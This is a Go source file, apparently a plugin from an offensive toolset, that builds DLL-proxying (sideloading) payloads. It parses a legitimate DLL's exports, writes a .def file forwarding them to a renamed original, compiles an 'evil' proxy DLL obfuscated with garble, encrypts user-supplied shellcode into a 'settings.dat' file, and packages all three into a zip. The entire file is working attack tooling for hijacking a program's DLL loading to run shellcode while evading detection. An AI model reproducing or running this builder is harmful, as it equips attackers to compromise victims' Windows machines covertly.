package plugins

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"toolset/utils"

	"github.com/fcharlie/buna/debug/pe"
)

type DllProxyer struct {
	BasePlugin
	shellcode []byte
	dllData   []byte
	dllName   string
	x64       bool // 是否为x64 shellcode
}

func NewDllProxyer(shellcode []byte, dllData []byte, dllName string, x64 bool) *DllProxyer {
	return &DllProxyer{
		BasePlugin: BasePlugin{
			PluginName: "dll_proxyer",
		},
		shellcode: shellcode,
		dllData:   dllData,
		dllName:   dllName,
		x64:       x64,
	}
}

// getExports 获取 dll 的导出表
func (p *DllProxyer) getExports() (exports []pe.ExportedSymbol, x64 bool, err error) {
	r := bytes.NewReader(p.dllData)
	pf, err := pe.NewFile(r)
	if err != nil {
		return
	}
	x64 = pf.FileHeader.SizeOfOptionalHeader == pe.OptionalHeader64Size
	exports, err = pf.LookupExports()
	return
}

// genDefContent 根据原始dll文件名称和导出表生成def文件内容
func (p *DllProxyer) genDefContent(exportList []pe.ExportedSymbol, oriDllName string) string {
	text := fmt.Sprintf("LIBRARY %s.dll\nEXPORTS", oriDllName)
	for _, i := range exportList {
		text = text + fmt.Sprintf("\n    %s = %s.%s @%d", i.Name, oriDllName, i.Name, i.Ordinal)
	}
	return text
}

func (p *DllProxyer) buildEvilDll(workDir string, x64 bool, expPath string) ([]byte, error) {
	env := os.Environ()
	env = append(env, "GOOS=windows")
	env = append(env, "CGO_ENABLED=1")
	if x64 {
		env = append(env, "GOARCH=amd64")
		env = append(env, "CC=x86_64-w64-mingw32-gcc")
	} else {
		env = append(env, "GOARCH=386")
		env = append(env, "CC=i686-w64-mingw32-gcc")
	}
	// 初始化 mod
	cmd := exec.Command("go", "mod", "init", "output")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = workDir
	cmd.Env = env
	err := cmd.Run()
	if err != nil {
		return nil, err
	}
	// 生成dll
	outputDll := filepath.Join(workDir, "output.dll")
	ldflags := fmt.Sprintf("-extldflags=-Wl,%s", expPath)
	cmd = exec.Command("garble", "-seed=random", "-literals", "-tiny", "build", "-o", outputDll, "-buildmode", "c-shared", "-ldflags", ldflags)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = workDir
	cmd.Env = env
	err = cmd.Run()
	if err != nil {
		return nil, err
	}
	return ioutil.ReadFile(outputDll)
}

func (p *DllProxyer) Run() ([]byte, error) {
	exports, isDllX64, err := p.getExports()
	if err != nil {
		return nil, err
	}
	// 如果 dll 与 shellcode 的架构不相同则不予生成
	if isDllX64 != p.x64 {
		return nil, fmt.Errorf("the architecture of the dll and shellcode must be the same")
	}
	originDllName := "_" + p.dllName
	defContent := p.genDefContent(exports, strings.TrimSuffix(originDllName, ".dll"))
	// 新建一个临时目录作为工作目录，并把所有的所需的基础文件拷贝过去
	tmpDir, err := p.buildTmpWorkDir()
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)
	// 新建def文件
	defPath := filepath.Join(tmpDir, "functions.def")
	err = ioutil.WriteFile(defPath, []byte(defContent), 0777)
	if err != nil {
		return nil, err
	}
	// 将def文件转为exp文件
	expPath := filepath.Join(tmpDir, "functions.exp")
	err = p.defToExp(isDllX64, defPath, expPath)
	if err != nil {
		return nil, err
	}
	// 进行转发dll编译
	evilDllData, err := p.buildEvilDll(tmpDir, isDllX64, expPath)
	if err != nil {
		return nil, err
	}
	// 生成加密处理后的 shellcode
	shellcodeData := utils.CustomEncryptData(p.shellcode)
	// 打包zip
	files := []utils.FileData{
		{
			Name: "settings.dat",
			Body: shellcodeData,
		},
		{
			Name: originDllName,
			Body: p.dllData,
		},
		{
			Name: p.dllName,
			Body: evilDllData,
		},
	}
	zipPath, err := utils.ZipData(files)
	if err != nil {
		return nil, err
	}
	defer os.Remove(zipPath)
	return ioutil.ReadFile(zipPath)
}
